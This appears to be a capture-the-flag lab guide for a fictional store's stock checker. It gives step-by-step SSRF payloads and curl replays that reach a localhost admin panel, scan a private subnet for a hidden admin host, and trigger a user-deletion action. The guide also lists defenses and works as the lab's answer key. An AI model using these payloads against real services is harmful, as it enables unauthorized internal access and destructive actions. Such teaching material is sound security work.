# Case Study: Lab 4 - Server-Side Request Forgery (SSRF)

## Business Context

**Company**: CloudStock Marketplace  
**Role**: Security Researcher  
**Date**: Q2 2026  
**Severity**: CRITICAL ⚠️

---

## Executive Summary

CloudStock Marketplace Module 5 contains two active SSRF challenge tracks:

- **Lab 5.1: Internal Loopback Access** (localhost admin pivot)
- **Lab 5.2: Back-end Discovery** (blind scan of `192.168.0.0/24`)

All sub-labs use a vulnerable server-side stock checker that trusts a user-controlled URL parameter. The canonical form in the UI is `stockApi`, but the backend also accepts `stock_api`, `stockapi`, `url`, and `targetUrl` in form, JSON, or query-string payloads.

Your task is to **exploit SSRF in each variant** to reach hidden admin interfaces and trigger the delete action for `carlos`.

---

## Business Problem

The application accepts user-supplied stock endpoint URLs and dispatches them server-side. This allows attackers to pivot from public pages into internal routes.

### Current Implementation Issues:
1. **No strict URL destination allowlist** - user controls the outbound stock URL
2. **Server-side internal dispatch exists** - internal paths are reachable from user input
3. **Admin actions exposed behind network trust assumptions** - `localhost` and the private `192.168.0.0/24` space are trusted
4. **Sensitive operations tied to predictable admin paths** - `/admin` and `/admin/delete?username=carlos`

---

## Challenge: Lab 4.1 - Internal Loopback Access

### Problem Statement

Lab 4.1 variants are storefront-themed systems where the product detail page submits a hidden `stockApi` field to the stock endpoint. If you tamper that value to point at `http://localhost/admin`, the server returns internal admin HTML.

From that HTML, extract and replay the delete endpoint for `carlos`.

---

## Variant 4.1 A: Retail Store (Loopback Admin Access)

### Problem Statement
**Theme**: Retail Store (Variation A)  
The retail stock checker trusts `stockApi` and can be redirected to localhost admin endpoints.

### Vulnerability Description
The backend accepts `stockApi` and dispatches internal requests when host patterns match local/internal targets. The admin panel includes a delete link for `carlos`.

### Attack Steps (Specific to 4.1.A)
1. Open `Lab 4.1.A` product page (`/lab4/1/a/product/<id>`).
2. Intercept the stock request to `/lab4/1/a/stock`.
3. Replace form value `stockApi` with:
   ```
   http://localhost/admin
   ```
4. Replay and capture returned admin HTML.
5. Extract the delete URL shown in the response:
   ```
   http://localhost/admin/delete?username=carlos
   ```
6. Submit that URL again through `/lab4/1/a/stock` as `stockApi`.
7. Capture the success response with the flag banner.

### Payload
```
stockApi=http://localhost/admin
```

### Expected Response
```html
<h1>Internal User Management Console</h1>
...
<a href="http://localhost/admin/delete?username=carlos">Delete</a>
```

### Final Success Response
```html
<h1>Success</h1>
<p>User carlos deleted successfully!</p>
<div>FLAG: ...</div>
```

### Why It Works
- Server performs request on attacker-controlled URL
- `localhost` is treated as trusted internal destination
- Admin action endpoint is exposed in returned HTML

---

## Variant 4.1 B: Cloud Infrastructure (Loopback Admin Access)

### Problem Statement
**Theme**: Cloud Infrastructure (Variation B)  
Same SSRF primitive as 4.1.A, different storefront branding and stock source domain.

### Vulnerability Description
Default request uses cloud-themed stock host, but `stockApi` can still be replaced with `http://localhost/admin` and replayed.

### Attack Steps (Specific to 4.1.B)
1. Open `/lab4/1/b/product/<id>`.
2. Intercept POST to `/lab4/1/b/stock`.
3. Change `stockApi` from the default domain to:
   ```
   http://localhost/admin
   ```
4. Replay and inspect HTML for delete action.
5. Set `stockApi` to:
   ```
   http://localhost/admin/delete?username=carlos
   ```
6. Replay through `/lab4/1/b/stock` and collect flag.

### Payload Variations
```
stockApi=http://localhost/admin
stockApi=http://127.0.0.1/admin
```

### Expected Findings
```json
{
  "theme": "Cloud Infrastructure",
  "entry_point": "/lab4/1/b/stock",
  "admin_panel": "http://localhost/admin",
  "delete_endpoint": "http://localhost/admin/delete?username=carlos"
}
```

### Why It Works
- `stockApi` is user-controlled
- Localhost destinations are internally dispatched
- Delete operation is reachable through SSRF replay

---

## Variant 4.1 C: Global Logistics (Loopback Admin Access)

### Problem Statement
**Theme**: Global Logistics (Variation C)  
The logistics stock checker follows the same vulnerable design and can be abused to access localhost admin paths.

### Vulnerability Description
Attack flow is identical to A/B; only the user-facing theme and default stock domain differ.

### Attack Steps (Specific to 4.1.C)
1. Open `/lab4/1/c/product/<id>`.
2. Intercept POST to `/lab4/1/c/stock`.
3. Replace `stockApi` with:
   ```
   http://localhost/admin
   ```
4. Replay and extract delete URL from admin response.
5. Submit:
   ```
   http://localhost/admin/delete?username=carlos
   ```
   through `/lab4/1/c/stock`.
6. Confirm admin delete success and collect flag.

### Payload Variations
```
stockApi=http://localhost/admin
stockApi=http://localhost/admin/delete?username=carlos
```

### Expected Path Responses
```
/admin                                → Internal admin HTML
/admin/delete?username=carlos         → Delete success + flag banner
```

### Why It Works
- SSRF sink directly accepts attacker input
- Internal-only admin route becomes reachable server-side
- Administrative action has no secondary authorization control

---

## Challenge: Lab 4.2 - Back-end Discovery (Blind SSRF)

### Problem Statement

Lab 4.2 simulates blind SSRF against private management hosts. Only one host in `192.168.0.0/24` exposes `/admin` on port `8080` for each variant/session identity, and the winning host is stable for that identity while the session remains the same.

You must find the correct host, then call `/admin/delete?username=carlos` on that same host.

---

## Variant 4.2 A: Retail Discovery (Arcade Avenue Outfitters)

### Problem Statement
**Theme**: Retail Discovery  
**Persona**: Arcade Avenue Outfitters  
You receive stock checks via a vulnerable stock gateway and must discover the valid private admin host.

### Vulnerability Description
Backend accepts `stockApi` and resolves private hosts in format `192.168.0.X:8080`. `/admin` returns 200 only for the correct X, while `/admin/delete?username=carlos` succeeds only on that same host.

### Attack Steps (Specific to 4.2.A)
1. Open `/lab4/2/a/product/<id>`.
2. Intercept POST to `/lab4/2/a/stock`.
3. Replace `stockApi` path from `/product/stock/check` to:
   ```
   http://192.168.0.1:8080/admin
   ```
4. Fuzz the last octet (`1-255`) and replay requests.
5. Identify the one response with `200` and the admin panel HTML.
6. Use the winning IP and set:
   ```
   http://192.168.0.<winning_octet>:8080/admin/delete?username=carlos
   ```
7. Replay through `/lab4/2/a/stock` and capture flag.

### Expected Finding
```json
{
  "variant": "4.2.A",
  "network": "192.168.0.0/24",
  "admin_port": 8080,
  "signal": "Single host returns 200 on /admin and the same host accepts the delete action"
}
```

### Why It Works
- Blind SSRF sink reveals success/failure via status/content
- Private host trust assumption is exploitable
- Admin delete path is exposed once host is discovered

---

## Variant 4.2 B: Cloud Discovery (Nimbus Compute Marketplace)

### Problem Statement
**Theme**: Cloud Discovery  
**Persona**: Nimbus Compute Marketplace  
The vulnerable stock checker can be transformed into an internal admin host scanner.

### Vulnerability Description
Route behavior mirrors 4.2.A, but under the cloud variant context and its own flag mapping.

### Attack Steps (Specific to 4.2.B)
1. Open `/lab4/2/b/product/<id>`.
2. Intercept `/lab4/2/b/stock` request.
3. Set `stockApi` to:
   ```
   http://192.168.0.1:8080/admin
   ```
4. Brute-force octet 1-255 until admin HTML appears.
5. Replay delete action on discovered host:
   ```
   http://192.168.0.<winning_octet>:8080/admin/delete?username=carlos
   ```
6. Capture flag from success response.

### Payload Variations
```
stockApi=http://192.168.0.42:8080/admin
stockApi=http://192.168.0.42:8080/admin/delete?username=carlos
```

### Expected Findings
```json
{
  "variant": "4.2.B",
  "persona": "Nimbus Compute Marketplace",
  "technique": "Blind SSRF host discovery + action replay"
}
```

### Why It Works
- Server requests attacker-provided private IP targets
- Only one target host serves admin content
- Same host accepts delete action for `carlos`

---

## Variant 4.2 C: Logistics Discovery (Portline Freight Systems)

### Problem Statement
**Theme**: Logistics Discovery  
**Persona**: Portline Freight Systems  
You must identify the hidden operations admin host on the private range and execute the delete action.

### Vulnerability Description
Blind SSRF response behavior leaks whether a private host/path is valid. Admin endpoint and delete action are reachable on the discovered host.

### Attack Steps (Specific to 4.2.C)
1. Open `/lab4/2/c/product/<id>`.
2. Intercept POST to `/lab4/2/c/stock`.
3. Change `stockApi` to admin probe URL:
   ```
   http://192.168.0.1:8080/admin
   ```
4. Fuzz final octet and observe responses.
5. Keep the host returning admin interface.
6. Submit delete URL on same host:
   ```
   http://192.168.0.<winning_octet>:8080/admin/delete?username=carlos
   ```
7. Collect flag from successful administrative action response.

### Expected Chained Exploitation
```
SSRF request to /admin probe
→ identify valid internal host
→ SSRF request to /admin/delete?username=carlos
→ receive flag
```

### Why It's Powerful
- Blind SSRF can still fully compromise internal operations paths
- Status/content differences are enough for discovery
- One SSRF sink enables internal admin action execution

---

## Common SSRF Bypass Techniques Used in Lab 4

### For Lab 4.1 Loopback Pivot
```
http://localhost/admin
http://127.0.0.1/admin
```

### For Lab 4.2 Private Host Discovery
```
http://192.168.0.X:8080/admin
http://192.168.0.X:8080/admin/delete?username=carlos
```

### Notes on This Module
```
- Lab 4.2 expects private host format 192.168.0.X only
- Port must be 8080 for admin responses
- The target octet is deterministic per session identity and variant
```

---

## Lab 4 Complete Variant Map

```
Lab 4.1 (Internal Loopback Access)
├─ Variant A: Retail Store
├─ Variant B: Cloud Infrastructure
└─ Variant C: Global Logistics

Lab 4.2 (Back-end Discovery)
├─ Variant A: Retail Discovery (Arcade Avenue Outfitters)
├─ Variant B: Cloud Discovery (Nimbus Compute Marketplace)
└─ Variant C: Logistics Discovery (Portline Freight Systems)
```

---

## Complete Exploitation Workflow (All Variants)

### Phase 1: Reconnaissance (All Variants)
```
1. Open a product detail page in the target variant
2. Trigger "Check Stock"
3. Intercept POST request containing stockApi
```

### Phase 2: Variant-Specific Exploitation

**Lab 4.1 A-C Path:**
```
4. Set stockApi=http://localhost/admin
5. Replay and read admin HTML
6. Extract /admin/delete?username=carlos URL
7. Replay delete URL via same /lab4/1/*/stock endpoint
8. Capture flag
```

**Lab 4.2 A-C Path:**
```
4. Set stockApi=http://192.168.0.1:8080/admin
5. Brute-force last octet 1..255
6. Identify host that returns admin HTML (200)
7. Replay /admin/delete?username=carlos on that host
8. Capture flag
```

---

## Expected Discoveries Across All Variants

### Lab 4.1 A Expected Discoveries:
```json
{
  "theme": "Retail Store",
  "entry_point": "/lab4/1/a/stock",
  "payload_1": "http://localhost/admin",
  "payload_2": "http://localhost/admin/delete?username=carlos",
  "result": "User carlos deleted",
  "flag": "Displayed in the success banner after the delete action"
}
```

### Lab 4.1 B Expected Discoveries:
```json
{
  "theme": "Cloud Infrastructure",
  "entry_point": "/lab4/1/b/stock",
  "payload_1": "http://localhost/admin",
  "payload_2": "http://localhost/admin/delete?username=carlos",
  "result": "User carlos deleted",
  "flag": "Displayed in the success banner after the delete action"
}
```

### Lab 4.1 C Expected Discoveries:
```json
{
  "theme": "Global Logistics",
  "entry_point": "/lab4/1/c/stock",
  "payload_1": "http://localhost/admin",
  "payload_2": "http://localhost/admin/delete?username=carlos",
  "result": "User carlos deleted",
  "flag": "Displayed in the success banner after the delete action"
}
```

### Lab 4.2 A Expected Discoveries:
```json
{
  "theme": "Retail Discovery",
  "persona": "Arcade Avenue Outfitters",
  "entry_point": "/lab4/2/a/stock",
  "scan_space": "192.168.0.0/24",
  "admin_path": "/admin",
  "delete_path": "/admin/delete?username=carlos",
  "flag": "Displayed in the success banner after the delete action"
}
```

### Lab 4.2 B Expected Discoveries:
```json
{
  "theme": "Cloud Discovery",
  "persona": "Nimbus Compute Marketplace",
  "entry_point": "/lab4/2/b/stock",
  "scan_space": "192.168.0.0/24",
  "admin_path": "/admin",
  "delete_path": "/admin/delete?username=carlos",
  "flag": "Displayed in the success banner after the delete action"
}
```

### Lab 4.2 C Expected Discoveries:
```json
{
  "theme": "Logistics Discovery",
  "persona": "Portline Freight Systems",
  "entry_point": "/lab4/2/c/stock",
  "scan_space": "192.168.0.0/24",
  "admin_path": "/admin",
  "delete_path": "/admin/delete?username=carlos",
  "flag": "Displayed in the success banner after the delete action"
}
```

---

## Step-by-Step General Exploitation Guide

### Step 1: Capture Stock Request
```
POST /lab4/<sub-lab>/.../stock
Content-Type: application/x-www-form-urlencoded

stockApi=http://<default-stock-host>/stock/check?... 
```

### Step 2: Tamper `stockApi`
- Lab 4.1: switch to `http://localhost/admin` or `http://127.0.0.1/admin`
- Lab 4.2: switch to `http://192.168.0.X:8080/admin`

### Step 3: Replay and Observe
- Look for admin HTML (`200`) vs not found (`404`)
- In Lab 4.2, the winning host is the one that returns the admin panel for that session identity

### Step 4: Execute Delete Action
```
http://<target>/admin/delete?username=carlos
```

### Step 5: Claim Flag
Extract the flag shown in the success response and submit.

---

## What You Should Discover

### Lab 4.1 Expected Discoveries:
```json
{
  "objective": "Loopback admin pivot",
  "working_payload": "http://localhost/admin",
  "delete_endpoint": "http://localhost/admin/delete?username=carlos",
  "result": "Admin action executed via SSRF",
  "response": "Success banner with the flag"
}
```

### Lab 4.2 Expected Discoveries:
```json
{
  "objective": "Blind internal host discovery",
  "working_probe": "http://192.168.0.X:8080/admin",
  "successful_signal": "Single host returns 200 + admin HTML",
  "result": "Delete action executed on discovered host",
  "response": "Administrative action complete banner with the flag"
}
```

---

## Technical Concepts Tested

### Server-Side Request Forgery (SSRF)
```
Attacker input
  -> vulnerable stockApi sink
  -> server-side request to internal destination
  -> internal admin response returned to attacker
```

**Why it works in this module:**
- User input directly controls destination URL
- Internal trust boundaries are assumed, not enforced
- Admin endpoints rely on network location rather than robust authorization

### Blind SSRF Discovery (Lab 4.2)
1. Probe candidate internal hosts
2. Use response status/content as discovery oracle
3. Replay privileged action once valid host is identified

### Defense (What You Should Learn)
- ✅ Strict allowlist for outbound request destinations
- ✅ Block loopback and private address ranges in user-driven requests
- ✅ Separate stock-check service from admin network
- ✅ Enforce authz on admin actions independent of source network
- ✅ Add SSRF-specific logging and anomaly detection

---

## Tools Recommended

### Intercept & Tamper
- Burp Suite (Repeater + Intruder)
- OWASP ZAP
- Any HTTP proxy with request editing

### Testing
```bash
# Lab 4.1 style replay
curl -X POST http://target/lab4/1/a/stock \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "stockApi=http://localhost/admin"

# Lab 4.2 style replay
curl -X POST http://target/lab4/2/a/stock \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "stockApi=http://192.168.0.10:8080/admin"
```

---

## Flag Submission Checklist

- [ ] Identified vulnerable `stockApi` parameter
- [ ] Executed variant-specific SSRF path
- [ ] Reached admin endpoint (`/admin`)
- [ ] Triggered delete action (`/admin/delete?username=carlos`)
- [ ] Captured flag for each sub-lab variant
- [ ] Documented exact payload and route used

---

## Real-World Impact

**If this vulnerability were not caught:**
- Internal admin panels could be reached from public workflows
- Privileged actions could be executed without direct admin access
- Private network services could be mapped and abused
- Security boundaries between frontend and internal management plane would collapse

---

## Key Takeaways

1. **Module 4.1 is a localhost admin pivot lab** across three themes
2. **Module 4.2 is a blind private-host discovery lab** across three themes
3. **Sub-lab themes matter for documentation and reporting context** (Retail, Cloud, Logistics)
4. **Correct delete parameter is `username=carlos`** in current implementation
5. **SSRF can convert normal stock checks into internal admin action channels**

---

## Related Security Concepts

- **CWE-918**: Server-Side Request Forgery (SSRF)
- **OWASP Top 10 A10:2021**: Server-Side Request Forgery
- **Zero Trust Networking**: Do not trust source location alone for admin actions

---

**Document findings per sub-lab with: variant theme, route used, payload chain, response evidence, and captured flag.**
